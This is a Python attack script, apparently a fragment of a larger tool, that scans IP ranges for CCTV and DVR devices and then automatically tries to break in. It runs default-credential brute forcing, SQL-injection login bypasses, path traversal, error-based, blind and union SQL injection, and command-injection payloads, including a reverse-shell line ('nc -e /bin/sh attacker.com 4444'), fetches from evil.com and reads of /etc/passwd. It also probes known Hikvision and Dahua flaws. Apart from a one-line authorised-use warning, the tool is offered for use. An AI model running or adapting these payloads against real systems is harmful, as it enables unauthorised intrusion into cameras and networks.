def is_valid_target(target):
    try:
        if '-' in target:
            base, end = target.split('-')
            ipaddress.IPv4Address(base.strip())
            int(end.strip())
            return True
        else:
            ipaddress.ip_network(target, strict=False)
            return True
    except:
        return False

def test_auth_bypass(ip, port):
    """Test common authentication bypass techniques - Enhanced payloads"""
    
    # Default credentials (username, password)
    default_creds = [
        ('admin', 'admin'), ('admin', '12345'), ('admin', 'password'),
        ('admin', '123456'), ('admin', '1234'), ('admin', 'admin123'),
        ('admin', ''), ('Administrator', 'admin'), ('root', 'root'),
        ('root', '12345'), ('root', 'toor'), ('root', ''),
        ('user', 'user'), ('guest', 'guest'), ('support', 'support'),
        ('tech', 'tech'), ('demo', 'demo'), ('test', 'test'),
        ('cisco', 'cisco'), ('telnet', 'telnet'), ('administrator', 'password'),
        ('admin', '111111'), ('admin', '123123'), ('admin', 'password123'),
        ('admin', 'Passw0rd'), ('Admin', '1234'), ('supervisor', 'supervisor'),
        ('operator', 'operator'), ('manager', 'manager'), ('service', 'service'),
        ('webadmin', 'webadmin'), ('sysadmin', 'sysadmin'), ('user', 'password'),
        ('admin', 'default'), ('admin', '123qwe'), ('admin', 'qwerty'),
        ('admin', '654321'), ('admin', 'abc123'), ('admin', '1qaz2wsx'),
        ('admin', 'admin123456'), ('root', 'default'), ('root', '123qwe'),
        ('Administrator', '12345'), ('guest', ''), ('anonymous', 'anonymous'),
    ]
    
    # SQL injection bypass for login forms
    sql_bypass = [
        ("' OR '1'='1", ""), ("' OR 1=1--", ""), ("admin' --", ""),
        ("admin' OR '1'='1'", ""), ("' OR '1'='1'#", ""), ("' OR 1=1/*", ""),
        ("admin' OR '1'='1' LIMIT 1--", ""), ("' UNION SELECT NULL--", ""),
        ("' OR 'x'='x", ""), ("' OR 1=1 AND '1'='1", ""),
        ("' OR '1'='1'/*", ""), ("admin'--", ""), ("' or 1=1 in (select @@version)--", ""),
        ("' OR '1'='1' AND SLEEP(5)--", ""), ("admin' OR 1=1-- -", ""),
        ("' OR 1=1 ORDER BY 1--", ""), ("' OR 1=1 UNION SELECT 1,2,3--", ""),
        ("admin' OR '1'='1'", ""), ("' OR ''='", ""), ("' OR 1=1 LIMIT 1--", ""),
    ]
    
    # Path traversal / no auth
    special = [
        ("", ""),  # empty credentials
        ("../", ""), ("../../", ""), ("./", ""),
        ("....//", ""), ("..;/", ""), ("%2e%2e%2f", ""),
    ]
    
    all_payloads = default_creds + sql_bypass + special
    
    headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/x-www-form-urlencoded'}
    login_paths = [
        "/login", "/login.html", "/login.asp", "/login.php", "/Login.cgi",
        "/admin", "/admin/login", "/cgi-bin/login", "/web/login", "/api/login",
        "/auth", "/authenticate", "/user/login", "/signin", "/logon",
        "/cgi-bin/hi3510/param.cgi?cmd=getuser", "/ISAPI/Security/userCheck",
        "/cgi-bin/magicBox.cgi?action=getSystemInfo"
    ]
    
    print(f"\n     [{YB}!{RE}] Testing authentication bypass (enhanced payloads)...")
    vulnerable = False
    
    for login_path in login_paths[:4]:  # Test first 4 paths
        for username, password in all_payloads[:50]:  # Test up to 50 payloads
            for protocol in ["http", "https"]:
                try:
                    url = f"{protocol}://{ip}:{port}{login_path}"
                    # Try GET with empty creds
                    if username == "" and password == "":
                        r = requests.get(url, timeout=5, verify=False, headers=headers)
                        if r.status_code == 200 and ("dashboard" in r.text.lower() or "admin" in r.text.lower() or "welcome" in r.text.lower()):
                            print(f"      [{G}✓{RE}] Auth Bypass Found! -> {url}")
                            print(f"      └─ No authentication required!")
                            vulnerable = True
                            break
                    # Try POST
                    data = {'username': username, 'password': password, 'user': username, 'pass': password, 'login': 'submit'}
                    r = requests.post(url, data=data, timeout=5, verify=False, headers=headers, allow_redirects=True)
                    if r.status_code == 200 and any(x in r.text.lower() for x in ["dashboard", "admin", "welcome", "home"]):
                        if "login" not in r.text.lower() and "signin" not in r.text.lower():
                            print(f"      [{G}✓{RE}] Auth Bypass Found! -> {url}")
                            print(f"      └─ Credentials: {YB}{username}:{password}{RE}")
                            vulnerable = True
                            break
                except:
                    continue
            if vulnerable:
                break
        if vulnerable:
            break
    
    if not vulnerable:
        print(f"      [{R}x{RE}] No auth bypass found with {len(all_payloads)} payloads")

def test_sql_injection(ip, port):
    """Test for SQL injection vulnerabilities - Enhanced payloads"""
    
    # Error-based payloads
    error_payloads = [
        "'", "''", "'\"", "\\", "1'", "1''", "1' AND 1=1--", "1' AND 1=2--",
        "' OR '1'='1", "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*", 
        "1' ORDER BY 1--", "1' ORDER BY 100--", "1' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT 1,2,3--",
        "1' AND SLEEP(5)--", "' WAITFOR DELAY '00:00:05'--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT VERSION()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--",
        "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT USER()),0x7e))--",
        "1' AND 1=CONVERT(int,@@version)--", "1' AND 1=CAST(DB_NAME() AS INT)--",
        "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--"
    ]
    
    # Boolean-based blind
    boolean_payloads = [
        "1' AND '1'='1", "1' AND '1'='2",
        "1 AND 1=1", "1 AND 1=2",
        "' AND '1'='1", "' AND '1'='2",
        "1' AND (SELECT 1 FROM users LIMIT 1)='1",
        "1' OR (SELECT 1 FROM users LIMIT 1)='1",
    ]
    
    # Time-based blind
    time_payloads = [
        "1' AND SLEEP(5)--", "1' AND BENCHMARK(5000000,MD5('test'))--",
        "1' OR SLEEP(5)--", "1' AND pg_sleep(5)--",
        "1' WAITFOR DELAY '00:00:05'--", "1' AND (SELECT * FROM (SELECT SLEEP(5))a)--",
        "1' AND (SELECT 1 FROM (SELECT SLEEP(5))a)='1",
        "1' OR (SELECT SLEEP(5))--",
    ]
    
    # Union-based
    union_payloads = [
        "1' UNION SELECT NULL--", "1' UNION SELECT NULL,NULL--",
        "1' UNION SELECT 1,2,3,4,5--", "1' UNION SELECT USER(),DATABASE(),VERSION()--",
        "1' UNION SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES--",
        "1' UNION SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS--",
    ]
    
    all_payloads = error_payloads + boolean_payloads + time_payloads + union_payloads
    
    test_paths = [
        "/page?id=1", "/view?id=1", "/index.php?id=1", "/product.php?id=1",
        "/category.php?id=1", "/details.php?id=1", "/item.php?id=1",
        "/news.php?id=1", "/article.php?id=1", "/post.php?id=1"
    ]
    
    headers = {'User-Agent': 'Mozilla/5.0'}
    print(f"\n     [{YB}!{RE}] Testing SQL injection (enhanced payloads)...")
    vulnerable = False
    
    for path in test_paths[:3]:
        for protocol in ["http", "https"]:
            for payload in all_payloads[:30]:  # Test first 30 payloads
                try:
                    test_url = f"{protocol}://{ip}:{port}{path.replace('1', urllib.parse.quote(payload))}"
                    start_time = time.time()
                    r = requests.get(test_url, timeout=10, verify=False, headers=headers)
                    response_time = time.time() - start_time
                    
                    # Error patterns
                    sql_errors = [
                        "sql syntax", "mysql", "ora-[0-9]{5}", "query failed", "odbc",
                        "driver", "sqlstate", "unclosed quotation mark", "syntax error",
                        "mysql_fetch", "you have an error", "warning: mysql",
                        "division by zero", "unknown column", "duplicate entry",
                        "SQLSTATE[HY000]", "Microsoft OLE DB", "PostgreSQL", "SQLite",
                        "ORA-00933", "ORA-01756", "PL/SQL", "pg_query"
                    ]
                    
                    for error in sql_errors:
                        if re.search(error, r.text, re.IGNORECASE):
                            print(f"      [{G}✓{RE}] SQL Injection Possible! -> {test_url[:80]}")
                            print(f"      └─ Error pattern: {YB}{error}{RE}")
                            vulnerable = True
                            break
                    
                    # Time-based detection
                    if response_time > 4 and any(x in payload for x in ["SLEEP", "WAITFOR", "BENCHMARK", "pg_sleep"]):
                        print(f"      [{G}✓{RE}] Time-based SQL Injection! -> {test_url[:80]}")
                        print(f"      └─ Response delay: {YB}{response_time:.2f} seconds{RE}")
                        vulnerable = True
                    
                    # Boolean-based (simple difference detection)
                    if "1=2" in payload and "1=1" not in payload:
                        # We'll just note possibility
                        pass
                        
                except:
                    continue
            if vulnerable:
                break
        if vulnerable:
            break
    
    if not vulnerable:
        print(f"      [{R}x{RE}] No SQL injection detected with {len(all_payloads)} payloads")

def test_rce_vulnerabilities(ip, port):
    """Test for Remote Code Execution vulnerabilities - Enhanced payloads"""
    
    # Command injection payloads (Linux & Windows)
    cmd_payloads = [
        # Linux
        "; ls", "; id", "; whoami", "; cat /etc/passwd", "; uname -a",
        "| ls", "| id", "| whoami", "|| ls", "&& ls", "& ls",
        "`whoami`", "$(whoami)", "$(cat /etc/passwd)", "`cat /etc/passwd`",
        "; echo vulnerable", "| echo vulnerable", "&& echo vulnerable",
        "; curl http://evil.com", "; wget http://evil.com",
        "; nc -e /bin/sh attacker.com 4444", "; python -c 'print(\"test\")'",
        "; perl -e 'print \"test\"'", "; ruby -e 'puts \"test\"'",
        # Windows
        "; dir", "; type C:\\Windows\\win.ini", "; echo %USERNAME%",
        "| dir", "| type C:\\Windows\\win.ini", "& dir", "&& dir",
        "| systeminfo", "& ver", "; ver", "| whoami", "& whoami",
        # Blind/out-of-band
        "; ping -c 3 attacker.com", "| ping -n 3 attacker.com",
        "; nslookup attacker.com", "| nslookup attacker.com",
        # Special chars bypass
        "%3B ls", "%7C ls", "%26 ls", "$IFS$9ls", "{cat,/etc/passwd}",
        "a=id;$a", "cmd.exe /c dir", "/bin/sh -c ls",
    ]
    
    # Parameters that may execute commands
    test_paths = [
        "/cgi-bin/exec?cmd=id", "/cgi-bin/system?cmd=id", "/api/command?cmd=id",
        "/exec?command=id", "/ping?host=localhost", "/system?cmd=id",
        "/util?cmd=id", "/debug?cmd=id", "/diag?cmd=id", "/test?cmd=id",
        "/cgi-bin/param.cgi?cmd=id", "/cgi-bin/hi3510/param.cgi?cmd=id",
        "/cgi-bin/SystemCommand.cgi?command=id", "/cmd.php?cmd=id",
        "/shell?cmd=id", "/rce?cmd=id", "/vuln?cmd=id"
    ]
    
    headers = {'User-Agent': 'Mozilla/5.0'}
    print(f"\n     [{YB}!{RE}] Testing RCE vulnerabilities (enhanced payloads)...")
    vulnerable = False
    
    for path in test_paths[:4]:
        for protocol in ["http", "https"]:
            for payload in cmd_payloads[:30]:  # Test first 30 payloads
                try:
                    test_url = f"{protocol}://{ip}:{port}{path.replace('id', urllib.parse.quote(payload))}"
                    r = requests.get(test_url, timeout=8, verify=False, headers=headers)
                    
                    # Indicators of command execution
                    cmd_indicators = [
                        "uid=", "gid=", "root:", "admin:", "windows", "volume serial",
                        "Directory of", "total ", "drwx", "-rw-r--r--", "etc/passwd",
                        "win.ini", "system32", "cmd.exe", "bash", "sh", "bin",
                        "USER=", "HOME=", "PATH=", "username", "hostname",
                        "Microsoft Windows", "Linux version", "Darwin Kernel",
                        "apache", "www-data", "nobody", "daemon"
                    ]
                    
                    for indicator in cmd_indicators:
                        if indicator in r.text:
                            print(f"      [{G}✓{RE}] RCE Vulnerability Found! -> {test_url[:80]}")
                            print(f"      └─ Command output indicator: {YB}{indicator}{RE}")
                            # Show first 2 lines of output
                            lines = [l for l in r.text.split('\n') if l.strip()][:2]
                            for line in lines:
                                if len(line) > 80:
                                    line = line[:77] + "..."
                                print(f"         └─ {line[:100]}")
                            vulnerable = True
                            break
                    
                    if vulnerable:
                        break
                except:
                    continue
            if vulnerable:
                break
        if vulnerable:
            break
    
    # Known vulnerable CCTV endpoints
    known_vulns = {
        "/cgi-bin/param.cgi?cmd=getuser": "Hikvision Auth Bypass (CVE-2017-7923)",
        "/onvif-http/snapshot?auth=YWRtaW46MTIzNDU=": "ONVIF Default Creds",
        "/cgi-bin/magicBox.cgi?action=getSystemInfo": "Dahua Info Leak",
        "/ISAPI/Security/userCheck": "Hikvision User Enumeration",
        "/cgi-bin/hi3510/param.cgi?cmd=getuser": "Hikvision Auth Bypass",
        "/cgi-bin/SystemCommand.cgi?cmd=id": "RCE on some DVRs",
        "/system/info.asp": "System Info Leak",
        "/cgi-bin/admin/getparam.cgi?system": "Hikvision Config Leak",
        "/cgi-bin/operator/getparam.cgi?system": "Hikvision Config Leak",
    }
    
    for endpoint, vuln_name in known_vulns.items():
        for protocol in ["http", "https"]:
            try:
                url = f"{protocol}://{ip}:{port}{endpoint}"
                r = requests.get(url, timeout=5, verify=False, headers=headers)
                if r.status_code == 200 and len(r.text) > 10:
                    print(f"      [{G}✓{RE}] Known Vulnerability: {YB}{vuln_name}{RE}")
                    print(f"      └─ Endpoint: {url[:80]}")
                    if "user" in endpoint and r.text:
                        print(f"         └─ Response snippet: {r.text[:100]}")
                    vulnerable = True
            except:
                continue
    if not vulnerable:
        print(f"      [{R}x{RE}] No RCE vulnerabilities detected with {len(cmd_payloads)} payloads")

def scan_with_nmap(target):
    try:
        nm = nmap.PortScanner()
        printrun(f"\n[{WB}#{RE}] Starting AGGRESSIVE SCAN on {WB}{target}{RE}")
        printrun(f"[{Y}!{RE}] High Intensity Scanning Mode\n")
        ports = "80,81,82,83,84,85,88,443,554,555,1935,1936,2020,5000,5001,5002,6001,6002,8000,8080,8081,8088,8090,8091,8099,8443,8444,8554,8899,9000,9001,10001,10002,10554,18004,34567,34599,37777,37778,37779"
        arguments = f'-p {ports} -T4 -sV --open -Pn --script=http-title,http-auth,rtsp-methods'
        printrun(f"[{WB}¡{RE}] Initializing scan...")
        start_loading()
        nm.scan(hosts=target, arguments=arguments)
        stop_loading()
        print(f"\r[{GB}✓{RE}] Scan completed!{RE}     ")
        print()
        scan_results = []
        found = False
        print(f"\n[{WB}?{RE}] Do you want to test for vulnerabilities? (y/n): ", end='')
        test_vulns = input().strip().lower() == 'y'
        for host in nm.all_hosts():
            if nm[host].state() == 'up':
                print("\n" + "-" * 55 + f"\n[{GB}+{RE}] Host        : {GB}{host}{RE}")
                found = True
                for proto in nm[host].all_protocols():
                    for port in sorted(nm[host][proto].keys()):
                        if nm[host][proto][port]['state'] == 'open':
                            service = nm[host][proto][port].get('name', 'unknown')
                            product = nm[host][proto][port].get('product', '')
                            version = nm[host][proto][port].get('version', '')
                            
                            print(f"    Port        : {GB}{port}{RE} {WB}OPEN ->{RE} {GB}{service} {product} {version}{RE}")
                            
                            script = nm[host][proto][port].get('script', {})
                            title = ""
                            auth = ""
                            
                            if 'http-title' in script:
                                title = decode_title(script['http-title'])
                                print(f"      └─ Title  : {WB}{title}{RE}")
                            if 'http-auth' in script:
                                auth = script['http-auth']
                                print(f"      └─ Auth   : {GB}{auth}{RE}")
                            
                            check_web_interface(host, port)
                            
                            if test_vulns and port in [80, 443, 8080, 8443, 8000, 8081, 8090, 8088, 8099]:
                                test_auth_bypass(host, port)
                                test_sql_injection(host, port)
                                test_rce_vulnerabilities(host, port)
                            
                            scan_results.append({
                                'ip': host,
                                'port': port,
                                'service': service,
                                'product': product,
                                'version': version,
                                'title': title,
                                'auth': auth
                            })
        
        if not found:
            print(f"\r[{R}x{RE}] No active hosts found.")
        
        if scan_results:
            with open("results.txt", "w", encoding="utf-8") as f:
                f.write("AGGRESSIVE NMAP SCAN RESULTS\n")
                f.write("="*50 + "\n")
                f.write(f"Target   : {target}\n")
                f.write(f"Total    : {len(scan_results)} services found\n")
                f.write("="*50 + "\n\n")
                for r in scan_results:
                    f.write("-"*50 + "\n")
                    f.write(f"IP       : {r['ip']}\n")
                    f.write(f"Port     : {r['port']}\n")
                    f.write(f"Service  : {r['service']} {r['product']} {r['version']}\n")
                    if r['title']:
                        f.write(f"Title    : {r['title']}\n")
                    if r['auth']:
                        f.write(f"Auth     : {r['auth']}\n")
                    f.write("-" * 50 + "\n")
            printrun(f"[{G}✓{RE}] Results saved to: {G}results.txt{RE}")
            
    except KeyboardInterrupt:
        stop_loading()
        print(f"\r[{RB}x{RE}] Scan stopped by user.\n")
    except Exception as e:
        stop_loading()
        print(f"\r[{YB}!{RE}] Error: {e}")

def check_web_interface(ip, port):
    headers = {'User-Agent': 'Mozilla/5.0'}
    common_paths = ["/", "/login", "/index.html", "/admin", "/cgi-bin/hi3510/snap.cgi",
                    "/ISAPI/Streaming/Channels/101", "/axis-cgi/mjpg/video.cgi"]
    print(f"     [{WB}*{RE}] Checking web interface on port {GB}{port}{RE}", end="")
    interface_found = False
    for path in common_paths[:5]:
        for protocol in ["http", "https"]:
            try:
                url = f"{protocol}://{ip}:{port}{path}"
                r = requests.get(url, timeout=4, verify=False, headers=headers, allow_redirects=True)
                if r.status_code in [200, 401, 403]:
                    interface_found = True
                    print(f"\n     [{G}✓{RE}] Web Interface -> {GB}{url}{RE}")
                    title_match = re.search(r'<title[^>]*>(.*?)</title>', r.text, re.IGNORECASE | re.DOTALL)
                    if title_match:
                        print(f"      └─ Title  : {WB}{decode_title(title_match.group(1))}{RE}")
                    content = r.text.lower()
                    if "hikvision" in content:
                        print(f"      └─ Device : {WB}Hikvision{RE}")
                    elif "dahua" in content:
                        print(f"      └─ Device : {WB}Dahua{RE}")
                    break
            except:
                continue
    if not interface_found:
        print(f"\n[{R}x{RE}] No web interface detected.")

if __name__ == "__main__":
    try:
        cctv_banner()
        printrun(f"[{WB}#{RE}] Aggressive Nmap Scanner with Vulnerability Testing")
        print(f"\n[{YB}!{RE}] {RB}WARNING: Hanya gunakan pada sistem yg anda MILIKI atau PUNYA IZIN\n    untuk melakukan pengujian!{RE}")
        print(f"\n[{WB}*{RE}] Examples :")
        print("    • 192.168.1.1/24")
        print("    • 192.168.1.1-255")
        print("    • 192.168.1.1")
        target = input(f"\n[{WB}?{RE}] Enter Target : ").strip()
        if not target:
            target = "192.168.1.1/24"
        if not is_valid_target(target):
            print(f"[{YB}!{RE}] Invalid target format!")
            input("\nPress Enter to continue...")
            sys.exit(1)
        scan_with_nmap(target)
        input("\nPress Enter to continue...")
        sys.exit(0)
    except KeyboardInterrupt:
        print(f"\n[{RB}x{RE}] Program closed by user.")
        sys.exit(0)


